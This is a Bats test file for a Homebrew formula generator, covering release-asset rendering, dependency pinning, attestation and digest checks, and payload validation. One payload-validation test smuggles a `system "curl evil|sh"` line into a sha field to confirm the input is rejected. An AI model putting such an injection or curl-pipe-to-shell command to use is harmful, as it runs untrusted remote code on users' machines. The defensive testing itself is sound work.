#!/usr/bin/env bats
# SPDX-License-Identifier: MIT
# Purpose: Tests for binary formula generation: arm64 release asset, pinned
# Intel (PyPI) branch, and the provenance checks that gate pinning (#471).

load "../../../helpers/common"
load "../../../helpers/mocks"

# Fixture product: winnow-media 0.0.1 (sdist fixture depends on click==8.1.7,
# whose PyPI JSON is a fixture too), rendered as a binary formula so every
# generation path is deterministic and offline apart from the analysis venv.
SDIST_SHA="846f7278e1ed929233c9de42a039eb42eb3a633f19517c7b65ed25f4a4ebe343"
OTHER_SHA="0000000000000000000000000000000000000000000000000000000000000000"
LEGACY_X86_SHA="e56b1f9d74e210a70d13b1d43e6924eaeab2af91a71703aeb9f9b184cb23ea75"
REPO="lgtm-hq/winnow"
BINARY_WF="lgtm-hq/winnow/.github/workflows/build-binaries.yml"
SDIST_WF="lgtm-hq/lgtm-ci/.github/workflows/reusable-build-python-dist.yml"

setup() {
	setup_temp_dir
	REPO_ROOT="$(repo_root)"
	bootstrap_test_env "$REPO_ROOT"
	SCRIPTS_DIR="$REPO_ROOT/scripts/ci"
	mock_gh_provenance "$TEST_TEMP_DIR/mock-bin"
	export MOCK_RELEASE_DIGEST="$SDIST_SHA"
	# The suite itself runs under GitHub Actions; the bypass tests below set
	# or unset this deliberately.
	unset GITHUB_ACTIONS SKIP_ASSET_VERIFY
	setup_fixtures
}

teardown() {
	teardown_temp_dir
}

# Fixture tree: pypi/ (JSON + PEP 740 provenance), sdist/ and assets/ next
# to it, as the generator's PYPI_FIXTURE_DIR seam expects.
setup_fixtures() {
	FIXTURES="$TEST_TEMP_DIR/fixtures"
	mkdir -p "$FIXTURES/pypi" "$FIXTURES/sdist" "$FIXTURES/assets"
	cp "$REPO_ROOT/tests/fixtures/pypi/click-8.1.7.json" "$FIXTURES/pypi/"
	cp "$REPO_ROOT/tests/fixtures/pypi/winnow-media-0.0.1-winnow_media-0.0.1.tar.gz.provenance.json" "$FIXTURES/pypi/"
	cp "$REPO_ROOT/tests/fixtures/sdist/winnow-media-0.0.1.tar.gz" "$FIXTURES/sdist/winnow_media-0.0.1.tar.gz"
	printf 'not really a mach-o binary\n' >"$FIXTURES/assets/winnow-macos-arm64"
	ARM64_SHA="$(shasum -a 256 "$FIXTURES/assets/winnow-macos-arm64" | cut -d' ' -f1)"
	write_pypi_json "$SDIST_SHA"
	export PYPI_FIXTURE_DIR="$FIXTURES/pypi"
}

write_pypi_json() { # $1 = sdist sha256 advertised by PyPI JSON
	python3 - "$FIXTURES/pypi/winnow-media-0.0.1.json" "$1" <<'PY'
import json, sys
path, sha = sys.argv[1:]
data = {
    "info": {"version": "0.0.1"},
    "urls": [{
        "packagetype": "sdist",
        "filename": "winnow_media-0.0.1.tar.gz",
        "url": "https://files.pythonhosted.org/packages/ab/cd/winnow_media-0.0.1.tar.gz",
        "digests": {"sha256": sha},
    }],
}
with open(path, "w", encoding="utf-8") as handle:
    json.dump(data, handle)
PY
}

write_config() { # $1 = require-attestation (true|false|none), $2 = key to omit
	CONFIG="$TEST_TEMP_DIR/winnow-binary.yml"
	local provenance=""
	if [[ "$1" != "none" ]]; then
		provenance="$(
			cat <<YAML | grep -v "^  ${2:-__none__}:"
provenance:
  require-attestation: $1
  repo: ${REPO}
  tag-prefix: v
  binary-signer-workflow: ${BINARY_WF}
  sdist-signer-workflow: ${SDIST_WF}
  pypi-publisher-workflow: publish-pypi-on-tag.yml
YAML
		)"
	fi
	cat >"$CONFIG" <<YAML
---
package: winnow-media
source-repo: lgtm-hq/winnow
homepage: https://github.com/lgtm-hq/winnow
license: MIT
description: "Organize, deduplicate, and keep the best from your media library"
${provenance}

formulas:
  winnow:
    type: binary
    test-command: "winnow --version"
    binary-url-pattern: >-
      https://github.com/lgtm-hq/winnow/releases/download/v{version}/winnow-macos-{arch}
    binary-names:
      arm64: winnow-macos-arm64
    install-name: winnow
    intel-pypi:
      python-version: "3.13"
YAML
}

assets_json() {
	printf '{"arm64-sha":"%s"}' "$ARM64_SHA"
}

run_generate() { # $1 = binary-assets json, rest = extra args
	local assets="$1"
	shift
	OUTPUT_FILE="$TEST_TEMP_DIR/winnow.rb"
	run bash "$SCRIPTS_DIR/generate-binary-formula.sh" \
		--config "$CONFIG" \
		--formula-key winnow \
		--version 0.0.1 \
		--output "$OUTPUT_FILE" \
		--binary-assets "$assets" \
		"$@"
}

# =============================================================================
# Rendering
# =============================================================================

@test "generate-binary-formula: matches the expected fixture byte for byte" {
	write_config true

	run_generate "$(assets_json)"

	[ "$status" -eq 0 ]
	sed "s/{{ARM64_SHA}}/${ARM64_SHA}/" \
		"$REPO_ROOT/tests/fixtures/expected/winnow-binary.rb" >"$TEST_TEMP_DIR/expected.rb"
	assert_files_equal "$TEST_TEMP_DIR/expected.rb" "$OUTPUT_FILE"
	! awk 'prev == "" && $0 == "" { found = 1 } { prev = $0 } END { exit !found }' "$OUTPUT_FILE"
}

@test "generate-binary-formula: on_arm installs the release binary" {
	write_config true

	run_generate "$(assets_json)"

	[ "$status" -eq 0 ]
	# The url carries the literal version (Homebrew scans it from there) and
	# the formula declares no redundant `version` line (brew audit --strict).
	awk '/on_arm do/,/end/' "$OUTPUT_FILE" |
		grep -q 'releases/download/v0.0.1/winnow-macos-arm64'
	! grep -qE '^  version "' "$OUTPUT_FILE"
	awk '/on_arm do/,/end/' "$OUTPUT_FILE" |
		grep -q "sha256 \"${ARM64_SHA}\""
	grep -q 'bin.install "winnow-macos-arm64" => "winnow"' "$OUTPUT_FILE"
	! grep -q 'winnow-macos-x86_64' "$OUTPUT_FILE"
}

@test "generate-binary-formula: on_intel pins every dependency and never resolves from PyPI" {
	write_config true

	run_generate "$(assets_json)"

	[ "$status" -eq 0 ]
	intel_block="$(awk '/^    on_intel do/,/^    end$/' "$OUTPUT_FILE")"
	grep -qF 'url "https://files.pythonhosted.org/packages/ab/cd/winnow_media-0.0.1.tar.gz"' <<<"$intel_block"
	grep -qF "sha256 \"${SDIST_SHA}\"" <<<"$intel_block"
	grep -q 'depends_on "python@3.13"' <<<"$intel_block"
	# The dependency closure (click) is a url+sha256 resource inside on_intel.
	grep -q '^      resource "click" do' <<<"$intel_block"
	grep -q 'click-8.1.7.tar.gz' <<<"$intel_block"
	[ "$(grep -c '^      resource "' "$OUTPUT_FILE")" -eq 1 ]
	# Install: virtualenv, then only Homebrew's pip_install helpers, which
	# pass std_pip_args (--no-deps among them) so pip never resolves from
	# PyPI; the resources above are the whole dependency closure.
	grep -q 'venv = virtualenv_create(libexec, "python3.13")' "$OUTPUT_FILE"
	grep -q 'venv.pip_install resources' "$OUTPUT_FILE"
	grep -q 'venv.pip_install_and_link buildpath' "$OUTPUT_FILE"
	# No unpinned pip resolution left anywhere in the formula.
	! grep -q '"#{buildpath}\[' "$OUTPUT_FILE"
	! grep -q '"--python=#{libexec}/bin/python", "install"' "$OUTPUT_FILE"
}

# pinme fixture: click (always), mdurl (only via the mcp extra) and idna
# (only on macOS x86_64, so never installed in the analysis venv).
write_pinme_config() { # $1 = extras yaml list ("" for none)
	CONFIG="$TEST_TEMP_DIR/pinme-binary.yml"
	cp "$REPO_ROOT/tests/fixtures/pypi/pinme-0.1.0.json" \
		"$REPO_ROOT/tests/fixtures/pypi/mdurl-0.1.2.json" \
		"$REPO_ROOT/tests/fixtures/pypi/idna-3.19.json" \
		"$REPO_ROOT/tests/fixtures/pypi/idna.json" "$FIXTURES/pypi/"
	cp "$REPO_ROOT/tests/fixtures/sdist/pinme-0.1.0.tar.gz" "$FIXTURES/sdist/"
	printf 'pinme binary\n' >"$FIXTURES/assets/pinme-macos-arm64"
	ARM64_SHA="$(shasum -a 256 "$FIXTURES/assets/pinme-macos-arm64" | cut -d' ' -f1)"
	cat >"$CONFIG" <<YAML
---
package: pinme
source-repo: lgtm-hq/pinme
homepage: https://github.com/lgtm-hq/pinme
license: MIT
description: "Fixture package for resource pinning"

formulas:
  pinme:
    type: binary
    test-command: "pinme --version"
    binary-url-pattern: >-
      https://github.com/lgtm-hq/pinme/releases/download/v{version}/pinme-macos-{arch}
    binary-names:
      arm64: pinme-macos-arm64
    install-name: pinme
    intel-pypi:
      python-version: "3.13"
${1}
YAML
}

run_generate_pinme() {
	OUTPUT_FILE="$TEST_TEMP_DIR/pinme.rb"
	run bash "$SCRIPTS_DIR/generate-binary-formula.sh" \
		--config "$CONFIG" \
		--formula-key pinme \
		--version 0.1.0 \
		--output "$OUTPUT_FILE" \
		--binary-assets "$(assets_json)"
}

@test "generate-binary-formula: extras-only dependencies are pinned and installed with the extras" {
	write_pinme_config $'      extras:\n        - mcp'

	run_generate_pinme

	[ "$status" -eq 0 ]
	intel_block="$(awk '/^    on_intel do/,/^    end$/' "$OUTPUT_FILE")"
	# mdurl is reachable only through pinme[mcp]; the walk followed the extra.
	grep -q '^      resource "mdurl" do' <<<"$intel_block"
	grep -q 'mdurl-0.1.2.tar.gz' <<<"$intel_block"
	grep -q '^      resource "click" do' <<<"$intel_block"
	# The formula installs the same extras spec against the pinned set.
	grep -q 'venv.pip_install_and_link "#{buildpath}\[mcp\]"' "$OUTPUT_FILE"
	grep -q 'dependency closure of pinme\[mcp\]' "$OUTPUT_FILE"
}

@test "generate-binary-formula: without extras the extras-only dependency is not pinned" {
	write_pinme_config ""

	run_generate_pinme

	[ "$status" -eq 0 ]
	! grep -q 'resource "mdurl"' "$OUTPUT_FILE"
	grep -q 'venv.pip_install_and_link buildpath' "$OUTPUT_FILE"
}

@test "generate-binary-formula: Intel markers resolve for macOS x86_64, not the generator host" {
	write_pinme_config ""

	run_generate_pinme

	[ "$status" -eq 0 ]
	# idna is gated on sys_platform == darwin and platform_machine == x86_64:
	# the analysis venv (whatever host runs CI) never installs it, so it is
	# resolved from PyPI metadata and pinned for the Intel branch.
	[[ "$output" == *"Resolved idna==3.19 from PyPI for the target environment"* ]]
	intel_block="$(awk '/^    on_intel do/,/^    end$/' "$OUTPUT_FILE")"
	grep -q '^      resource "idna" do' <<<"$intel_block"
	grep -q 'idna-3.19.tar.gz' <<<"$intel_block"
	[ "$(grep -c '^      resource "' "$OUTPUT_FILE")" -eq 2 ]
}

@test "generate-binary-formula: Intel homebrew-deps render sorted with the Python dependency" {
	write_config true
	cat >>"$CONFIG" <<'YAML'
      homebrew-deps:
        - libyaml
YAML

	run_generate "$(assets_json)"

	[ "$status" -eq 0 ]
	intel_block="$(awk '/^    on_intel do/,/^    end$/' "$OUTPUT_FILE")"
	deps="$(grep 'depends_on' <<<"$intel_block" | tr -d ' ')"
	[ "$deps" = $'depends_on"libyaml"\ndepends_on"python@3.13"' ]
}

@test "generate-binary-formula: fails when fewer resources than min-resource-count are pinned" {
	write_config true
	cat >>"$CONFIG" <<'YAML'
      min-resource-count: 5
YAML

	run_generate "$(assets_json)"

	[ "$status" -ne 0 ]
	[[ "$output" == *"Expected at least 5 resource stanzas but only found 1"* ]]
}

@test "generate-binary-formula: legacy and arm64-only payloads render identically" {
	write_config true

	run_generate "$(assets_json)"
	[ "$status" -eq 0 ]
	cp "$OUTPUT_FILE" "$TEST_TEMP_DIR/arm64-only.rb"

	run_generate "$(printf '{"arm64-sha":"%s","x86-sha":"%s"}' "$ARM64_SHA" "$LEGACY_X86_SHA")"
	[ "$status" -eq 0 ]
	[[ "$output" == *"Ignoring binary-assets x86-sha"* ]]
	! grep -q "$LEGACY_X86_SHA" "$OUTPUT_FILE"
	assert_files_equal "$TEST_TEMP_DIR/arm64-only.rb" "$OUTPUT_FILE"
}

# =============================================================================
# Provenance gate (runs before anything is pinned)
# =============================================================================

@test "generate-binary-formula: verifies arm64 attestation and sdist provenance before rendering" {
	write_config true

	run_generate "$(assets_json)"

	[ "$status" -eq 0 ]
	[[ "$output" == *"arm64 asset sha256 verified"* ]]
	[[ "$output" == *"Attestation verified for winnow-macos-arm64 (repo ${REPO}, signer workflow ${BINARY_WF})"* ]]
	[[ "$output" == *"sdist digests agree for winnow_media-0.0.1.tar.gz"* ]]
	[[ "$output" == *"PEP 740 provenance for winnow_media-0.0.1.tar.gz matches"* ]]
	[[ "$output" == *"Attestation verified for winnow_media-0.0.1.tar.gz (repo ${REPO}, signer workflow ${SDIST_WF})"* ]]
	grep -q "^attestation verify .*/winnow-macos-arm64 --repo ${REPO} --signer-workflow ${BINARY_WF}$" "$MOCK_GH_LOG"
	grep -q "^attestation verify .*/winnow_media-0.0.1.tar.gz --repo ${REPO} --signer-workflow ${SDIST_WF}$" "$MOCK_GH_LOG"
	grep -q "^api repos/${REPO}/releases/tags/v0.0.1 " "$MOCK_GH_LOG"
}

@test "generate-binary-formula: arm64 asset without a valid attestation fails without rendering" {
	write_config true
	export MOCK_GH_ATTEST_MODE=fail
	export MOCK_GH_ATTEST_FAIL_FOR=winnow-macos-arm64

	run_generate "$(assets_json)"

	[ "$status" -ne 0 ]
	[[ "$output" == *"Attestation verification failed for winnow-macos-arm64"* ]]
	[[ "$output" == *"no attestation from repo ${REPO}, signer workflow ${BINARY_WF} matched"* ]]
	[ ! -f "$OUTPUT_FILE" ]
}

@test "generate-binary-formula: arm64 asset with no attestation at all (404) fails" {
	write_config true
	export MOCK_GH_ATTEST_MODE=missing
	export MOCK_GH_ATTEST_FAIL_FOR=winnow-macos-arm64

	run_generate "$(assets_json)"

	[ "$status" -ne 0 ]
	[[ "$output" == *"Attestation verification failed for winnow-macos-arm64"* ]]
	[[ "$output" == *"no attestations found"* ]]
	[ ! -f "$OUTPUT_FILE" ]
}

@test "generate-binary-formula: require-attestation false only warns on a missing attestation" {
	write_config false
	export MOCK_GH_ATTEST_MODE=missing

	run_generate "$(assets_json)"

	[ "$status" -eq 0 ]
	[[ "$output" == *"[WARN]"*"Attestation verification failed for winnow-macos-arm64"* ]]
	[[ "$output" == *"require-attestation is false, continuing"* ]]
	[ -f "$OUTPUT_FILE" ]
}

@test "generate-binary-formula: sdist digest differing between PyPI and the GitHub Release fails" {
	write_config true
	export MOCK_RELEASE_DIGEST="$OTHER_SHA"

	run_generate "$(assets_json)"

	[ "$status" -ne 0 ]
	[[ "$output" == *"sdist digest mismatch for winnow_media-0.0.1.tar.gz"* ]]
	[[ "$output" == *"PyPI JSON:       ${SDIST_SHA}"* ]]
	[[ "$output" == *"downloaded file: ${SDIST_SHA}"* ]]
	[[ "$output" == *"GitHub Release:  ${OTHER_SHA}"* ]]
	[ ! -f "$OUTPUT_FILE" ]
}

@test "generate-binary-formula: sdist bytes not matching the PyPI digest fail" {
	write_config true
	write_pypi_json "$OTHER_SHA"

	run_generate "$(assets_json)"

	[ "$status" -ne 0 ]
	[[ "$output" == *"SHA256 mismatch for sdist asset"* ]]
	[ ! -f "$OUTPUT_FILE" ]
}

@test "generate-binary-formula: arm64 bytes not matching the dispatched digest fail" {
	write_config true

	run_generate "$(printf '{"arm64-sha":"%s"}' "$OTHER_SHA")"

	[ "$status" -ne 0 ]
	[[ "$output" == *"SHA256 mismatch for arm64 asset"* ]]
	[ ! -f "$OUTPUT_FILE" ]
}

@test "generate-binary-formula: sdist attestation failure fails when required" {
	write_config true
	export MOCK_GH_ATTEST_MODE=fail
	export MOCK_GH_ATTEST_FAIL_FOR=winnow_media-0.0.1.tar.gz

	run_generate "$(assets_json)"

	[ "$status" -ne 0 ]
	[[ "$output" == *"Attestation verification failed for winnow_media-0.0.1.tar.gz"* ]]
	[ ! -f "$OUTPUT_FILE" ]
}

@test "generate-binary-formula: without a provenance block the sha256 checks still run and the skip is logged" {
	write_config none

	run_generate "$(assets_json)"

	[ "$status" -eq 0 ]
	[[ "$output" == *"arm64 asset sha256 verified"* ]]
	[[ "$output" == *"sdist asset sha256 verified"* ]]
	[[ "$output" == *"[WARN]"*"No provenance block in config for winnow"* ]]
	[ ! -s "$MOCK_GH_LOG" ]
}

@test "generate-binary-formula: an incomplete provenance block fails naming the key (required)" {
	write_config true binary-signer-workflow

	run_generate "$(assets_json)"

	[ "$status" -ne 0 ]
	[[ "$output" == *"provenance.binary-signer-workflow is required for winnow"* ]]
	[ ! -f "$OUTPUT_FILE" ]
}

@test "generate-binary-formula: an incomplete provenance block fails even when attestation is not required" {
	write_config false repo

	run_generate "$(assets_json)"

	[ "$status" -ne 0 ]
	[[ "$output" == *"provenance.repo is required for winnow"* ]]
	[[ "$output" != *"skipping"* ]]
	[ ! -f "$OUTPUT_FILE" ]
}

@test "generate-binary-formula: a provenance block without tag-prefix fails" {
	write_config true tag-prefix

	run_generate "$(assets_json)"

	[ "$status" -ne 0 ]
	[[ "$output" == *"provenance.tag-prefix is required for winnow"* ]]
}

# =============================================================================
# Verification bypass (local regeneration only)
# =============================================================================

@test "generate-binary-formula: --skip-asset-verify skips the arm64 download and provenance locally" {
	write_config true
	rm "$FIXTURES/assets/winnow-macos-arm64"

	run_generate "$(assets_json)" --skip-asset-verify

	[ "$status" -eq 0 ]
	[[ "$output" == *"ASSET VERIFICATION DISABLED"* ]]
	[ ! -s "$MOCK_GH_LOG" ]
}

@test "generate-binary-formula: SKIP_ASSET_VERIFY=1 is accepted locally" {
	write_config true
	rm "$FIXTURES/assets/winnow-macos-arm64"
	export SKIP_ASSET_VERIFY=1

	run_generate "$(assets_json)"

	[ "$status" -eq 0 ]
	[[ "$output" == *"ASSET VERIFICATION DISABLED"* ]]
}

@test "generate-binary-formula: SKIP_ASSET_VERIFY=0 is refused, not treated as a skip" {
	write_config true
	export SKIP_ASSET_VERIFY=0

	run_generate "$(assets_json)"

	[ "$status" -ne 0 ]
	[[ "$output" == *"SKIP_ASSET_VERIFY must be exactly 1"* ]]
	[ ! -f "$OUTPUT_FILE" ]
}

@test "generate-binary-formula: SKIP_ASSET_VERIFY is refused under GitHub Actions" {
	write_config true
	export GITHUB_ACTIONS=true
	export SKIP_ASSET_VERIFY=1

	run_generate "$(assets_json)"

	[ "$status" -ne 0 ]
	[[ "$output" == *"Refusing to skip asset verification under GitHub Actions"* ]]
	[ ! -f "$OUTPUT_FILE" ]
}

@test "generate-binary-formula: --skip-asset-verify is refused under GitHub Actions" {
	write_config true
	export GITHUB_ACTIONS=true

	run_generate "$(assets_json)" --skip-asset-verify

	[ "$status" -ne 0 ]
	[[ "$output" == *"Refusing to skip asset verification under GitHub Actions"* ]]
	[ ! -f "$OUTPUT_FILE" ]
}

@test "generate-binary-formula: under GitHub Actions without a bypass the checks run" {
	write_config true
	export GITHUB_ACTIONS=true

	run_generate "$(assets_json)"

	[ "$status" -eq 0 ]
	grep -q "^attestation verify" "$MOCK_GH_LOG"
}

# =============================================================================
# Payload validation
# =============================================================================

@test "generate-binary-formula: rejects non-hex arm64 sha" {
	write_config true
	binary_assets="{\"arm64-sha\":\"deadbeef\\\"\\n    system \\\"curl evil|sh\\\"\\n    sha256 \\\"x\"}"

	run_generate "$binary_assets"

	[ "$status" -ne 0 ]
	[[ "$output" == *"arm64-sha must be a 64-character lowercase hex"* ]]
}

@test "generate-binary-formula: rejects non-hex legacy x86 sha" {
	write_config true

	run_generate "$(printf '{"arm64-sha":"%s","x86-sha":"deadbeef"}' "$ARM64_SHA")"

	[ "$status" -ne 0 ]
	[[ "$output" == *"x86-sha, when present, must be a 64-character lowercase hex"* ]]
}

@test "generate-binary-formula: rejects a payload without arm64-sha" {
	write_config true

	run_generate "{\"x86-sha\":\"$LEGACY_X86_SHA\"}"

	[ "$status" -ne 0 ]
	[[ "$output" == *"arm64-sha must be a 64-character lowercase hex"* ]]
}

@test "generate-binary-formula: fails when the PyPI sdist is unavailable" {
	write_config true
	rm "$FIXTURES/pypi/winnow-media-0.0.1.json"

	run_generate "$(assets_json)"

	[ "$status" -ne 0 ]
	[[ "$output" == *"Missing PyPI fixture for winnow-media"* ]]
}

@test "generate-binary-formula: --pypi-package overrides the sdist source" {
	write_config true

	run_generate "$(assets_json)" --pypi-package winnow-renamed

	[ "$status" -ne 0 ]
	[[ "$output" == *"Missing PyPI fixture for winnow-renamed"* ]]
}

# =============================================================================
# Committed lintro configuration and formula
# =============================================================================

@test "lintro config: attestation is required with the py-lintro identities" {
	run python3 "$SCRIPTS_DIR/read_formula_config.py" \
		"$REPO_ROOT/formulas/lintro.yml" --formula-key lintro --json
	[ "$status" -eq 0 ]

	run python3 -c '
import json, sys
p = json.loads(sys.argv[1])["provenance"]
assert p["require-attestation"] is True, p
assert p["repo"] == "lgtm-hq/py-lintro", p
assert p["binary-signer-workflow"] == "lgtm-hq/py-lintro/.github/workflows/build-binaries.yml", p
assert p["sdist-signer-workflow"] == "lgtm-hq/lgtm-ci/.github/workflows/reusable-build-python-dist.yml", p
assert p["pypi-publisher-workflow"] == "publish-pypi-on-tag.yml", p
' "$output"
	[ "$status" -eq 0 ]
}

@test "lintro config: lintro-full inherits the product provenance block" {
	run python3 "$SCRIPTS_DIR/read_formula_config.py" \
		"$REPO_ROOT/formulas/lintro.yml" --formula-key lintro-full --json
	[ "$status" -eq 0 ]
	run python3 -c 'import json, sys; sys.exit(0 if json.loads(sys.argv[1])["provenance"]["repo"] == "lgtm-hq/py-lintro" else 1)' "$output"
	[ "$status" -eq 0 ]
}

@test "committed lintro.rb: Intel branch is fully pinned, mcp extra included, no version line" {
	formula="$REPO_ROOT/Formula/lintro.rb"
	intel_block="$(awk '/^    on_intel do/,/^    end$/' "$formula")"
	# At least the runtime set is pinned (mirrors intel-pypi.min-resource-count).
	[ "$(grep -c '^      resource "' <<<"$intel_block")" -ge 5 ]
	# lintro[mcp] pulls the mcp SDK; it must be pinned like everything else.
	grep -q '^      resource "mcp" do' <<<"$intel_block"
	grep -q 'depends_on "libyaml"' <<<"$intel_block"
	grep -q 'venv.pip_install_and_link "#{buildpath}\[mcp\]"' "$formula"
	# Exactly one blank line separates the sdist resources from the wheel
	# resources, and no double blank line exists anywhere (brew style).
	grep -q -B2 'pydantic-core requires Rust' "$formula"
	[ "$(grep -B2 'pydantic-core requires Rust' "$formula" | head -1)" = "      end" ]
	[ "$(grep -B1 'pydantic-core requires Rust' "$formula" | head -1)" = "" ]
	! awk 'prev == "" && $0 == "" { found = 1 } { prev = $0 } END { exit !found }' "$formula"
	! grep -qE '^  version "' "$formula"
	grep -q 'releases/download/v[0-9][0-9.]*/lintro-macos-arm64' "$formula"
}
